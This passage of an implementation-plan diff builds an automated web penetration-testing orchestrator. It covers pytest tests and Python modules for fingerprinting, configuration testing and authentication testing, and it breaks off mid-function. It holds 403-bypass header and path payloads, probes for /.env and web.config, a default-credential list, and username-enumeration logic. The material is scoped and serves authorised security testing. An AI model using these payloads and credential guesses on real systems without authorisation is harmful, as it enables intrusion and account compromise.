@@ -2659,32 +2659,2760 @@ git commit -m "feat: implement ReconModule with subdomain enum, live probing, an
 
 ---
 
-## Task 14-21: Remaining Modules (Skeleton + Core Logic)
+## Task 14: Fingerprinting Module
 
-Tasks 14-21 follow the same pattern as Task 13. Each module:
-1. Extends `BaseModule`
-2. Implements `execute()` with subcategory checks
-3. Reads from state, enriches state
-4. Logs evidence
-5. Has tests with mocked dependencies
+**Files:**
+- Create: `wstg_orchestrator/modules/fingerprinting.py`
+- Create: `tests/test_fingerprinting.py`
 
-**These are listed as individual tasks for execution but share the same structure. Implement in order:**
+**Step 1: Write failing tests**
 
-- **Task 14:** `fingerprinting.py` — nmap XML parse, WhatWeb, header analysis, CVE lookup
-- **Task 15:** `configuration_testing.py` — robots/sitemap, gobuster, 403 bypass, HTTP methods, cloud enum
-- **Task 16:** `auth_testing.py` — username enum, default creds, lockout detection
-- **Task 17:** `authorization_testing.py` — IDOR fuzzing, JWT testing, hidden field tampering
-- **Task 18:** `session_testing.py` — cookie flags, fixation, reuse, rotation
-- **Task 19:** `input_validation.py` — SQLi/XSS/CMDi probes with tool handoff
-- **Task 20:** `business_logic.py` — workflow skip, price tamper, race conditions
-- **Task 21:** `api_testing.py` — Swagger detection, BOLA, GraphQL introspection
+```python
+# tests/test_fingerprinting.py
+import pytest
+from unittest.mock import MagicMock, AsyncMock, patch
+from wstg_orchestrator.modules.fingerprinting import FingerprintingModule
 
-Each task follows the same step pattern:
-1. Write failing tests
-2. Run to confirm failure
-3. Implement module
-4. Run to confirm pass
-5. Commit
+
+@pytest.fixture
+def fp_module():
+    state = MagicMock()
+    state.get.side_effect = lambda key: {
+        "live_hosts": ["https://app.example.com"],
+        "technologies": ["nginx"],
+        "server_versions": [],
+        "frameworks": [],
+        "inferred_cves": [],
+    }.get(key, [])
+    state.is_phase_complete.return_value = False
+    state.is_subcategory_complete.return_value = False
+    config = MagicMock()
+    config.base_domain = "example.com"
+    config.get_tool_config.return_value = {}
+    scope = MagicMock()
+    scope.is_in_scope.return_value = True
+    limiter = MagicMock()
+    evidence = MagicMock()
+    evidence.log_tool_output.return_value = "/tmp/test"
+    evidence.log_parsed.return_value = "/tmp/test"
+    evidence.log_request.return_value = "/tmp/test"
+    evidence.log_response.return_value = "/tmp/test"
+    callback = MagicMock()
+    return FingerprintingModule(state, config, scope, limiter, evidence, callback)
+
+
+def test_phase_name(fp_module):
+    assert fp_module.PHASE_NAME == "fingerprinting"
+
+
+def test_subcategories(fp_module):
+    assert "service_scanning" in fp_module.SUBCATEGORIES
+    assert "header_analysis" in fp_module.SUBCATEGORIES
+    assert "cve_correlation" in fp_module.SUBCATEGORIES
+
+
+@pytest.mark.asyncio
+async def test_header_analysis_extracts_server(fp_module):
+    mock_resp = MagicMock()
+    mock_resp.status_code = 200
+    mock_resp.headers = {"Server": "Apache/2.4.51", "X-Powered-By": "PHP/8.1.0"}
+    mock_resp.text = ""
+    mock_resp.content = b""
+    mock_resp.url = "https://app.example.com"
+    mock_resp.elapsed = 0.5
+    mock_resp.request_method = "GET"
+    mock_resp.request_url = "https://app.example.com"
+    mock_resp.request_headers = {}
+    mock_resp.request_body = None
+
+    with patch.object(fp_module, '_make_request', new_callable=AsyncMock, return_value=mock_resp):
+        results = await fp_module._analyze_headers("https://app.example.com")
+        assert any("Apache" in v for v in results["server_versions"])
+        assert any("PHP" in v for v in results["frameworks"])
+
+
+@pytest.mark.asyncio
+async def test_nmap_parsing(fp_module):
+    nmap_xml = '''<?xml version="1.0"?>
+    <nmaprun>
+        <host>
+            <address addr="93.184.216.34" addrtype="ipv4"/>
+            <ports>
+                <port protocol="tcp" portid="443">
+                    <state state="open"/>
+                    <service name="https" product="nginx" version="1.21.0"/>
+                </port>
+            </ports>
+        </host>
+    </nmaprun>'''
+    results = fp_module._parse_nmap_xml(nmap_xml)
+    assert any(p["port"] == 443 for p in results["ports"])
+    assert any("nginx" in v for v in results["server_versions"])
+```
+
+**Step 2: Run tests to verify they fail**
+
+```bash
+pytest tests/test_fingerprinting.py -v
+```
+
+**Step 3: Implement FingerprintingModule**
+
+```python
+# wstg_orchestrator/modules/fingerprinting.py
+import json
+import re
+import xml.etree.ElementTree as ET
+
+from wstg_orchestrator.modules.base_module import BaseModule
+from wstg_orchestrator.utils.command_runner import CommandRunner
+
+
+class FingerprintingModule(BaseModule):
+    PHASE_NAME = "fingerprinting"
+    SUBCATEGORIES = ["service_scanning", "header_analysis", "error_analysis", "cve_correlation"]
+    EVIDENCE_SUBDIRS = [
+        "tool_output", "raw_requests", "raw_responses", "parsed",
+        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
+    ]
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self._cmd = CommandRunner(
+            tool_configs={
+                name: self.config.get_tool_config(name)
+                for name in ["nmap", "whatweb"]
+            }
+        )
+
+    async def execute(self):
+        if not self.should_skip_subcategory("service_scanning"):
+            await self._service_scanning()
+            self.mark_subcategory_complete("service_scanning")
+
+        if not self.should_skip_subcategory("header_analysis"):
+            await self._header_analysis()
+            self.mark_subcategory_complete("header_analysis")
+
+        if not self.should_skip_subcategory("error_analysis"):
+            await self._error_analysis()
+            self.mark_subcategory_complete("error_analysis")
+
+        if not self.should_skip_subcategory("cve_correlation"):
+            await self._cve_correlation()
+            self.mark_subcategory_complete("cve_correlation")
+
+    async def _service_scanning(self):
+        self.logger.info("Starting service scanning")
+        live_hosts = self.state.get("live_hosts") or []
+        all_ports = []
+        all_versions = []
+
+        # Extract hostnames for nmap
+        from urllib.parse import urlparse
+        hosts = list(set(urlparse(h).hostname for h in live_hosts if urlparse(h).hostname))
+
+        if hosts and self._cmd.is_tool_available("nmap"):
+            for host in hosts:
+                result = self._cmd.run(
+                    "nmap", ["-sV", "-oX", "-", host], timeout=300,
+                )
+                if result.returncode == 0:
+                    self.evidence.log_tool_output("fingerprinting", f"nmap_{host}", result.stdout)
+                    parsed = self._parse_nmap_xml(result.stdout)
+                    all_ports.extend(parsed["ports"])
+                    all_versions.extend(parsed["server_versions"])
+        else:
+            self.logger.warning("nmap not available or no hosts to scan")
+
+        # WhatWeb integration
+        if self._cmd.is_tool_available("whatweb"):
+            for host_url in live_hosts[:20]:  # limit to first 20
+                result = self._cmd.run(
+                    "whatweb", ["--color=never", "-q", "--log-json=-", host_url], timeout=60,
+                )
+                if result.returncode == 0:
+                    self.evidence.log_tool_output("fingerprinting", "whatweb", result.stdout)
+                    try:
+                        for line in result.stdout.splitlines():
+                            if line.strip():
+                                entry = json.loads(line)
+                                for plugin_name, plugin_data in entry.get("plugins", {}).items():
+                                    versions = plugin_data.get("version", [])
+                                    for v in versions:
+                                        all_versions.append(f"{plugin_name}/{v}")
+                    except (json.JSONDecodeError, AttributeError):
+                        pass
+
+        self.state.enrich("open_ports", all_ports)
+        self.state.enrich("server_versions", list(set(all_versions)))
+        self.evidence.log_parsed("fingerprinting", "service_scan_results", {
+            "ports": all_ports, "versions": list(set(all_versions)),
+        })
+
+    def _parse_nmap_xml(self, xml_str: str) -> dict:
+        ports = []
+        versions = []
+        try:
+            root = ET.fromstring(xml_str)
+            for host in root.findall(".//host"):
+                addr_el = host.find("address")
+                addr = addr_el.get("addr", "") if addr_el is not None else ""
+                for port_el in host.findall(".//port"):
+                    port_id = int(port_el.get("portid", 0))
+                    protocol = port_el.get("protocol", "tcp")
+                    state_el = port_el.find("state")
+                    state = state_el.get("state", "") if state_el is not None else ""
+                    service_el = port_el.find("service")
+                    service_name = ""
+                    product = ""
+                    version = ""
+                    if service_el is not None:
+                        service_name = service_el.get("name", "")
+                        product = service_el.get("product", "")
+                        version = service_el.get("version", "")
+                    ports.append({
+                        "host": addr, "port": port_id, "protocol": protocol,
+                        "state": state, "service": service_name,
+                        "product": product, "version": version,
+                    })
+                    if product:
+                        ver_str = f"{product}/{version}" if version else product
+                        versions.append(ver_str)
+        except ET.ParseError as e:
+            self.logger.warning(f"Failed to parse nmap XML: {e}")
+        return {"ports": ports, "server_versions": versions}
+
+    async def _header_analysis(self):
+        self.logger.info("Starting header analysis")
+        live_hosts = self.state.get("live_hosts") or []
+        all_versions = []
+        all_frameworks = []
+
+        for host_url in live_hosts:
+            try:
+                resp = await self._make_request(host_url)
+                results = await self._analyze_headers(host_url, response=resp)
+                all_versions.extend(results.get("server_versions", []))
+                all_frameworks.extend(results.get("frameworks", []))
+            except Exception as e:
+                self.logger.debug(f"Header analysis failed for {host_url}: {e}")
+
+        self.state.enrich("server_versions", list(set(all_versions)))
+        self.state.enrich("frameworks", list(set(all_frameworks)))
+
+    async def _make_request(self, url: str):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        from wstg_orchestrator.utils.scope_checker import ScopeChecker
+        from wstg_orchestrator.utils.rate_limit_handler import RateLimiter
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.get(url)
+
+    async def _analyze_headers(self, url: str, response=None) -> dict:
+        versions = []
+        frameworks = []
+
+        if response is None:
+            response = await self._make_request(url)
+
+        headers = response.headers if hasattr(response, 'headers') else {}
+
+        server = headers.get("Server", "")
+        if server:
+            versions.append(server)
+
+        powered_by = headers.get("X-Powered-By", "")
+        if powered_by:
+            frameworks.append(powered_by)
+
+        asp_version = headers.get("X-AspNet-Version", "")
+        if asp_version:
+            frameworks.append(f"ASP.NET/{asp_version}")
+
+        generator = headers.get("X-Generator", "")
+        if generator:
+            frameworks.append(generator)
+
+        # Cookie analysis for framework hints
+        set_cookie = headers.get("Set-Cookie", "")
+        if "PHPSESSID" in set_cookie:
+            frameworks.append("PHP")
+        if "JSESSIONID" in set_cookie:
+            frameworks.append("Java")
+        if "ASP.NET" in set_cookie:
+            frameworks.append("ASP.NET")
+        if "laravel_session" in set_cookie:
+            frameworks.append("Laravel")
+        if "csrftoken" in set_cookie and "django" not in str(frameworks).lower():
+            frameworks.append("Django (possible)")
+
+        self.evidence.log_request("fingerprinting", {"method": "GET", "url": url})
+        self.evidence.log_response("fingerprinting", {
+            "url": url, "status": response.status_code,
+            "headers": dict(headers),
+        })
+
+        return {"server_versions": versions, "frameworks": frameworks}
+
+    async def _error_analysis(self):
+        self.logger.info("Starting error analysis")
+        live_hosts = self.state.get("live_hosts") or []
+        error_paths = [
+            "/nonexistent_path_" + "x" * 50,
+            "/%00", "/~", "/..;/",
+            "/index.php.bak", "/web.config", "/.env",
+        ]
+
+        for host_url in live_hosts[:10]:
+            for path in error_paths:
+                try:
+                    resp = await self._make_request(f"{host_url.rstrip('/')}{path}")
+                    if resp.status_code in [500, 502, 503]:
+                        # Check for stack traces or version info
+                        body = resp.text if hasattr(resp, 'text') else ""
+                        stack_patterns = [
+                            r"(Traceback.*?(?:Error|Exception).*?)(?:\n\n|\Z)",
+                            r"(at\s+[\w\.$]+\([\w\.]+:\d+\))",
+                            r"(Version:\s*[\d\.]+)",
+                            r"(PHP (?:Fatal|Warning|Notice).*)",
+                        ]
+                        for pattern in stack_patterns:
+                            matches = re.findall(pattern, body, re.DOTALL)
+                            if matches:
+                                self.evidence.log_potential_exploit("fingerprinting", {
+                                    "type": "information_disclosure",
+                                    "url": f"{host_url}{path}",
+                                    "details": matches[0][:500],
+                                    "severity": "low",
+                                })
+                except Exception:
+                    continue
+
+    async def _cve_correlation(self):
+        self.logger.info("Starting CVE correlation")
+        versions = self.state.get("server_versions") or []
+        all_cves = []
+
+        for version_str in versions:
+            try:
+                import requests as req_lib
+                # Use NIST NVD API or cve.circl.lu
+                parts = version_str.split("/")
+                if len(parts) >= 2:
+                    product = parts[0].lower()
+                    version = parts[1]
+                    resp = req_lib.get(
+                        f"https://cve.circl.lu/api/search/{product}",
+                        timeout=15,
+                    )
+                    if resp.status_code == 200:
+                        data = resp.json()
+                        if isinstance(data, list):
+                            for cve in data[:5]:  # top 5 per product
+                                cve_id = cve.get("id", "")
+                                summary = cve.get("summary", "")
+                                all_cves.append({
+                                    "cve_id": cve_id,
+                                    "product": version_str,
+                                    "summary": summary[:200],
+                                })
+            except Exception as e:
+                self.logger.debug(f"CVE lookup failed for {version_str}: {e}")
+
+        if all_cves:
+            self.state.enrich("inferred_cves", all_cves)
+            self.evidence.log_parsed("fingerprinting", "inferred_cves", all_cves)
+            self.logger.info(f"Found {len(all_cves)} potential CVEs")
+```
+
+**Step 4: Run tests**
+
+```bash
+pytest tests/test_fingerprinting.py -v
+```
+
+Expected: All PASS
+
+**Step 5: Commit**
+
+```bash
+git add wstg_orchestrator/modules/fingerprinting.py tests/test_fingerprinting.py
+git commit -m "feat: implement FingerprintingModule with nmap, header analysis, and CVE correlation"
+```
+
+---
+
+## Task 15: Configuration Testing Module
+
+**Files:**
+- Create: `wstg_orchestrator/modules/configuration_testing.py`
+- Create: `tests/test_configuration_testing.py`
+
+**Step 1: Write failing tests**
+
+```python
+# tests/test_configuration_testing.py
+import pytest
+from unittest.mock import MagicMock, AsyncMock, patch
+from wstg_orchestrator.modules.configuration_testing import ConfigTestingModule
+
+
+@pytest.fixture
+def config_module():
+    state = MagicMock()
+    state.get.side_effect = lambda key: {
+        "live_hosts": ["https://app.example.com"],
+        "endpoints": [],
+        "exposed_admin_paths": [],
+        "cloud_assets": [],
+    }.get(key, [])
+    state.is_phase_complete.return_value = False
+    state.is_subcategory_complete.return_value = False
+    config = MagicMock()
+    config.base_domain = "example.com"
+    config.get_tool_config.return_value = {}
+    config.custom_headers = {}
+    scope = MagicMock()
+    scope.is_in_scope.return_value = True
+    scope.is_attack_vector_allowed.return_value = True
+    limiter = MagicMock()
+    evidence = MagicMock()
+    evidence.log_tool_output.return_value = "/tmp/test"
+    evidence.log_parsed.return_value = "/tmp/test"
+    evidence.log_request.return_value = "/tmp/test"
+    evidence.log_response.return_value = "/tmp/test"
+    evidence.log_potential_exploit.return_value = "/tmp/test"
+    callback = MagicMock()
+    return ConfigTestingModule(state, config, scope, limiter, evidence, callback)
+
+
+def test_phase_name(config_module):
+    assert config_module.PHASE_NAME == "configuration_testing"
+
+
+def test_subcategories(config_module):
+    assert "metafile_testing" in config_module.SUBCATEGORIES
+    assert "http_method_testing" in config_module.SUBCATEGORIES
+    assert "cloud_storage_enum" in config_module.SUBCATEGORIES
+
+
+def test_parse_robots_txt(config_module):
+    robots = "User-agent: *\nDisallow: /admin/\nDisallow: /secret/\nAllow: /public/"
+    paths = config_module._parse_robots_txt(robots)
+    assert "/admin/" in paths
+    assert "/secret/" in paths
+
+
+def test_detect_cloud_patterns(config_module):
+    urls = [
+        "https://mybucket.s3.amazonaws.com/file",
+        "https://storage.googleapis.com/mybucket/file",
+        "https://myaccount.blob.core.windows.net/container/file",
+        "https://normal.example.com/page",
+    ]
+    cloud = config_module._detect_cloud_patterns(urls)
+    assert len(cloud) == 3
+    assert any(c["provider"] == "aws_s3" for c in cloud)
+    assert any(c["provider"] == "gcs" for c in cloud)
+    assert any(c["provider"] == "azure_blob" for c in cloud)
+```
+
+**Step 2: Run tests to verify they fail**
+
+```bash
+pytest tests/test_configuration_testing.py -v
+```
+
+**Step 3: Implement ConfigTestingModule**
+
+```python
+# wstg_orchestrator/modules/configuration_testing.py
+import re
+
+from wstg_orchestrator.modules.base_module import BaseModule
+from wstg_orchestrator.utils.command_runner import CommandRunner
+
+
+CLOUD_PATTERNS = [
+    (r'[\w\-]+\.s3[\.\-](?:[\w\-]+\.)?amazonaws\.com', "aws_s3"),
+    (r's3://[\w\-]+', "aws_s3"),
+    (r'storage\.googleapis\.com/[\w\-]+', "gcs"),
+    (r'[\w\-]+\.storage\.googleapis\.com', "gcs"),
+    (r'[\w\-]+\.blob\.core\.windows\.net', "azure_blob"),
+]
+
+BYPASS_403_HEADERS = [
+    {"X-Original-URL": "/{path}"},
+    {"X-Rewrite-URL": "/{path}"},
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Custom-IP-Authorization": "127.0.0.1"},
+]
+
+BYPASS_403_PATHS = [
+    "/{path}/.",
+    "/{path}//",
+    "/{path}%20",
+    "/{path}%09",
+    "/{path}..;/",
+    "/{path};",
+]
+
+
+class ConfigTestingModule(BaseModule):
+    PHASE_NAME = "configuration_testing"
+    SUBCATEGORIES = [
+        "metafile_testing", "directory_bruteforce",
+        "http_method_testing", "cloud_storage_enum",
+    ]
+    EVIDENCE_SUBDIRS = [
+        "tool_output", "raw_requests", "raw_responses", "parsed",
+        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
+    ]
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self._cmd = CommandRunner(
+            tool_configs={
+                name: self.config.get_tool_config(name)
+                for name in ["gobuster", "dirsearch"]
+            }
+        )
+
+    async def execute(self):
+        if not self.should_skip_subcategory("metafile_testing"):
+            await self._metafile_testing()
+            self.mark_subcategory_complete("metafile_testing")
+
+        if not self.should_skip_subcategory("directory_bruteforce"):
+            await self._directory_bruteforce()
+            self.mark_subcategory_complete("directory_bruteforce")
+
+        if not self.should_skip_subcategory("http_method_testing"):
+            await self._http_method_testing()
+            self.mark_subcategory_complete("http_method_testing")
+
+        if not self.should_skip_subcategory("cloud_storage_enum"):
+            await self._cloud_storage_enum()
+            self.mark_subcategory_complete("cloud_storage_enum")
+
+    async def _metafile_testing(self):
+        self.logger.info("Starting metafile testing")
+        live_hosts = self.state.get("live_hosts") or []
+        all_paths = []
+
+        for host_url in live_hosts:
+            base = host_url.rstrip("/")
+            # robots.txt
+            try:
+                resp = self._http_get(f"{base}/robots.txt")
+                if resp.status_code == 200 and "disallow" in resp.text.lower():
+                    paths = self._parse_robots_txt(resp.text)
+                    all_paths.extend(paths)
+                    self.evidence.log_tool_output("configuration_testing", f"robots_{base}", resp.text)
+            except Exception:
+                pass
+
+            # sitemap.xml
+            try:
+                resp = self._http_get(f"{base}/sitemap.xml")
+                if resp.status_code == 200 and "<url" in resp.text.lower():
+                    urls = re.findall(r'<loc>(.*?)</loc>', resp.text)
+                    self.state.enrich("endpoints", urls)
+                    self.evidence.log_tool_output("configuration_testing", f"sitemap_{base}", resp.text)
+            except Exception:
+                pass
+
+        if all_paths:
+            self.state.enrich("exposed_admin_paths", all_paths)
+            self.evidence.log_parsed("configuration_testing", "robots_paths", all_paths)
+
+    def _parse_robots_txt(self, content: str) -> list[str]:
+        paths = []
+        for line in content.splitlines():
+            line = line.strip()
+            if line.lower().startswith("disallow:"):
+                path = line.split(":", 1)[1].strip()
+                if path and path != "/":
+                    paths.append(path)
+        return paths
+
+    async def _directory_bruteforce(self):
+        self.logger.info("Starting directory brute forcing")
+        live_hosts = self.state.get("live_hosts") or []
+        found_paths = []
+
+        for host_url in live_hosts[:5]:  # Limit to first 5 hosts
+            if self._cmd.is_tool_available("gobuster"):
+                result = self._cmd.run(
+                    "gobuster",
+                    ["dir", "-u", host_url, "-w", "/usr/share/wordlists/dirb/common.txt",
+                     "-q", "--no-color", "-t", "10"],
+                    timeout=300,
+                )
+                if result.returncode == 0:
+                    self.evidence.log_tool_output("configuration_testing", "gobuster", result.stdout)
+                    for line in result.stdout.splitlines():
+                        if "(Status:" in line:
+                            path_match = re.match(r'(/\S+)', line)
+                            if path_match:
+                                found_path = path_match.group(1)
+                                found_paths.append(f"{host_url.rstrip('/')}{found_path}")
+                                status_match = re.search(r'Status:\s*(\d+)', line)
+                                if status_match and status_match.group(1) == "403":
+                                    await self._try_403_bypass(host_url, found_path)
+            else:
+                self.logger.warning("gobuster not found, skipping directory brute force")
+
+        if found_paths:
+            self.state.enrich("endpoints", found_paths)
+
+    async def _try_403_bypass(self, base_url: str, path: str):
+        base = base_url.rstrip("/")
+        # Header-based bypasses
+        for header_template in BYPASS_403_HEADERS:
+            headers = {k: v.format(path=path) for k, v in header_template.items()}
+            try:
+                resp = self._http_get(f"{base}{path}", extra_headers=headers)
+                if resp.status_code == 200:
+                    self.evidence.log_potential_exploit("configuration_testing", {
+                        "type": "403_bypass",
+                        "url": f"{base}{path}",
+                        "bypass_method": str(headers),
+                        "severity": "medium",
+                    })
+                    self.state.enrich("potential_vulnerabilities", [{
+                        "type": "403_bypass", "url": f"{base}{path}",
+                        "severity": "medium",
+                        "description": f"403 bypass via headers: {headers}",
+                    }])
+            except Exception:
+                continue
+
+        # Path-based bypasses
+        for path_template in BYPASS_403_PATHS:
+            bypass_path = path_template.format(path=path.rstrip("/"))
+            try:
+                resp = self._http_get(f"{base}{bypass_path}")
+                if resp.status_code == 200:
+                    self.evidence.log_potential_exploit("configuration_testing", {
+                        "type": "403_bypass",
+                        "url": f"{base}{bypass_path}",
+                        "bypass_method": f"path: {bypass_path}",
+                        "severity": "medium",
+                    })
+            except Exception:
+                continue
+
+    async def _http_method_testing(self):
+        self.logger.info("Starting HTTP method testing")
+        live_hosts = self.state.get("live_hosts") or []
+
+        for host_url in live_hosts:
+            # OPTIONS request
+            try:
+                resp = self._http_request("OPTIONS", host_url)
+                allow = resp.headers.get("Allow", "")
+                if allow:
+                    self.evidence.log_parsed("configuration_testing", f"methods_{host_url}", {
+                        "url": host_url, "allowed_methods": allow,
+                    })
+                    # Check for dangerous methods
+                    dangerous = {"PUT", "DELETE", "TRACE"}
+                    allowed_set = {m.strip().upper() for m in allow.split(",")}
+                    found_dangerous = dangerous & allowed_set
+
+                    if found_dangerous:
+                        self.state.enrich("potential_vulnerabilities", [{
+                            "type": "dangerous_http_methods",
+                            "url": host_url,
+                            "methods": list(found_dangerous),
+                            "severity": "medium",
+                            "description": f"Dangerous HTTP methods enabled: {found_dangerous}",
+                        }])
+
+                    # TRACE XST test
+                    if "TRACE" in allowed_set:
+                        trace_resp = self._http_request("TRACE", host_url)
+                        if trace_resp.status_code == 200 and "TRACE" in trace_resp.text:
+                            self.evidence.log_confirmed_exploit("configuration_testing", {
+                                "type": "xst",
+                                "url": host_url,
+                                "severity": "low",
+                                "description": "Cross-Site Tracing (XST) - TRACE method reflects request",
+                            })
+            except Exception as e:
+                self.logger.debug(f"Method testing failed for {host_url}: {e}")
+
+    async def _cloud_storage_enum(self):
+        self.logger.info("Starting cloud storage enumeration")
+        endpoints = self.state.get("endpoints") or []
+        live_hosts = self.state.get("live_hosts") or []
+        all_urls = endpoints + live_hosts
+
+        cloud_assets = self._detect_cloud_patterns(all_urls)
+
+        # Test public access for each detected asset
+        for asset in cloud_assets:
+            try:
+                resp = self._http_get(asset["url"])
+                asset["public_read"] = resp.status_code == 200
+                if resp.status_code == 200:
+                    self.evidence.log_potential_exploit("configuration_testing", {
+                        "type": "public_cloud_storage",
+                        "url": asset["url"],
+                        "provider": asset["provider"],
+                        "severity": "high",
+                        "description": f"Publicly readable {asset['provider']} storage",
+                    })
+                    self.state.enrich("potential_vulnerabilities", [{
+                        "type": "public_cloud_storage",
+                        "url": asset["url"],
+                        "severity": "high",
+                        "description": f"Publicly readable {asset['provider']} storage",
+                    }])
+            except Exception:
+                asset["public_read"] = False
+
+        if cloud_assets:
+            self.state.enrich("cloud_assets", cloud_assets)
+            self.evidence.log_parsed("configuration_testing", "cloud_assets", cloud_assets)
+
+    def _detect_cloud_patterns(self, urls: list[str]) -> list[dict]:
+        found = []
+        for url in urls:
+            for pattern, provider in CLOUD_PATTERNS:
+                if re.search(pattern, url, re.I):
+                    found.append({"url": url, "provider": provider})
+                    break
+        return found
+
+    def _http_get(self, url: str, extra_headers: dict | None = None):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.get(url, headers=extra_headers)
+
+    def _http_request(self, method: str, url: str):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.request(method, url)
+```
+
+**Step 4: Run tests**
+
+```bash
+pytest tests/test_configuration_testing.py -v
+```
+
+Expected: All PASS
+
+**Step 5: Commit**
+
+```bash
+git add wstg_orchestrator/modules/configuration_testing.py tests/test_configuration_testing.py
+git commit -m "feat: implement ConfigTestingModule with metafiles, dir brute, method testing, cloud enum"
+```
+
+---
+
+## Task 16: Auth Testing Module
+
+**Files:**
+- Create: `wstg_orchestrator/modules/auth_testing.py`
+- Create: `tests/test_auth_testing.py`
+
+**Step 1: Write failing tests**
+
+```python
+# tests/test_auth_testing.py
+import pytest
+from unittest.mock import MagicMock, AsyncMock, patch
+from wstg_orchestrator.modules.auth_testing import AuthTestingModule
+
+
+@pytest.fixture
+def auth_module():
+    state = MagicMock()
+    state.get.side_effect = lambda key: {
+        "live_hosts": ["https://app.example.com"],
+        "auth_endpoints": ["https://app.example.com/login"],
+        "valid_usernames": [],
+    }.get(key, [])
+    state.is_phase_complete.return_value = False
+    state.is_subcategory_complete.return_value = False
+    config = MagicMock()
+    config.base_domain = "example.com"
+    config.get_tool_config.return_value = {}
+    config.custom_headers = {}
+    scope = MagicMock()
+    scope.is_in_scope.return_value = True
+    scope.is_attack_vector_allowed.return_value = True
+    limiter = MagicMock()
+    evidence = MagicMock()
+    evidence.log_tool_output.return_value = "/tmp/test"
+    evidence.log_parsed.return_value = "/tmp/test"
+    evidence.log_request.return_value = "/tmp/test"
+    evidence.log_response.return_value = "/tmp/test"
+    evidence.log_potential_exploit.return_value = "/tmp/test"
+    evidence.log_confirmed_exploit.return_value = "/tmp/test"
+    callback = MagicMock()
+    return AuthTestingModule(state, config, scope, limiter, evidence, callback)
+
+
+def test_phase_name(auth_module):
+    assert auth_module.PHASE_NAME == "auth_testing"
+
+
+def test_subcategories(auth_module):
+    assert "username_enumeration" in auth_module.SUBCATEGORIES
+    assert "default_credentials" in auth_module.SUBCATEGORIES
+    assert "lockout_testing" in auth_module.SUBCATEGORIES
+
+
+def test_default_credentials_list(auth_module):
+    creds = auth_module.DEFAULT_CREDENTIALS
+    assert ("admin", "admin") in creds
+    assert ("root", "root") in creds
+
+
+def test_detect_username_enum_by_response_diff(auth_module):
+    resp_valid = MagicMock()
+    resp_valid.text = "Invalid password for this account"
+    resp_valid.status_code = 200
+    resp_valid.elapsed = 0.2
+
+    resp_invalid = MagicMock()
+    resp_invalid.text = "User does not exist"
+    resp_invalid.status_code = 200
+    resp_invalid.elapsed = 0.2
+
+    result = auth_module._detect_enum_by_diff(resp_valid, resp_invalid)
+    assert result["enumerable"] is True
+    assert result["method"] == "response_content"
+```
+
+**Step 2: Run tests to verify they fail**
+
+```bash
+pytest tests/test_auth_testing.py -v
+```
+
+**Step 3: Implement AuthTestingModule**
+
+```python
+# wstg_orchestrator/modules/auth_testing.py
+import time
+import statistics
+
+from wstg_orchestrator.modules.base_module import BaseModule
+from wstg_orchestrator.utils.parser_utils import diff_responses
+
+
+class AuthTestingModule(BaseModule):
+    PHASE_NAME = "auth_testing"
+    SUBCATEGORIES = ["username_enumeration", "default_credentials", "lockout_testing"]
+    EVIDENCE_SUBDIRS = [
+        "tool_output", "raw_requests", "raw_responses", "parsed",
+        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
+    ]
+
+    DEFAULT_CREDENTIALS = [
+        ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
+        ("admin", "12345"), ("root", "root"), ("root", "toor"),
+        ("root", "password"), ("test", "test"), ("user", "user"),
+        ("guest", "guest"), ("admin", "changeme"), ("admin", ""),
+        ("administrator", "administrator"), ("admin", "P@ssw0rd"),
+    ]
+
+    async def execute(self):
+        if not self.should_skip_subcategory("username_enumeration"):
+            await self._username_enumeration()
+            self.mark_subcategory_complete("username_enumeration")
+
+        if not self.should_skip_subcategory("default_credentials"):
+            await self._default_credentials()
+            self.mark_subcategory_complete("default_credentials")
+
+        if not self.should_skip_subcategory("lockout_testing"):
+            if self.is_attack_allowed("brute_force"):
+                await self._lockout_testing()
+            else:
+                self.logger.info("Brute force testing not allowed by scope, skipping lockout test")
+            self.mark_subcategory_complete("lockout_testing")
+
+    async def _username_enumeration(self):
+        self.logger.info("Starting username enumeration")
+        auth_endpoints = self.state.get("auth_endpoints") or []
+        if not auth_endpoints:
+            auth_endpoints = await self._discover_auth_endpoints()
+
+        for endpoint in auth_endpoints:
+            # Response difference detection
+            try:
+                resp_likely_valid = self._post_login(endpoint, "admin", "wrong_password_xyz")
+                resp_likely_invalid = self._post_login(endpoint, "definitely_not_a_real_user_xyzzy", "wrong")
+                result = self._detect_enum_by_diff(resp_likely_valid, resp_likely_invalid)
+
+                if result["enumerable"]:
+                    self.evidence.log_potential_exploit("auth_testing", {
+                        "type": "username_enumeration",
+                        "url": endpoint,
+                        "method": result["method"],
+                        "severity": "medium",
+                        "description": f"Username enumeration possible via {result['method']}",
+                    })
+                    self.state.enrich("potential_vulnerabilities", [{
+                        "type": "username_enumeration",
+                        "url": endpoint,
+                        "severity": "medium",
+                        "description": f"Username enumeration via {result['method']}",
+                    }])
+            except Exception as e:
+                self.logger.debug(f"Username enum test failed for {endpoint}: {e}")
+
+            # Timing-based detection
+            try:
+                timings_valid = []
+                timings_invalid = []
+                for _ in range(5):
+                    start = time.monotonic()
+                    self._post_login(endpoint, "admin", "wrong")
+                    timings_valid.append(time.monotonic() - start)
+
+                    start = time.monotonic()
+                    self._post_login(endpoint, "nonexistent_user_xyzzy", "wrong")
+                    timings_invalid.append(time.monotonic() - start)
+
+                avg_valid = statistics.mean(timings_valid)
+                avg_invalid = statistics.mean(timings_invalid)
+                if abs(avg_valid - avg_invalid) > 0.3:
+                    self.evidence.log_potential_exploit("auth_testing", {
+                        "type": "username_enumeration_timing",
+                        "url": endpoint,
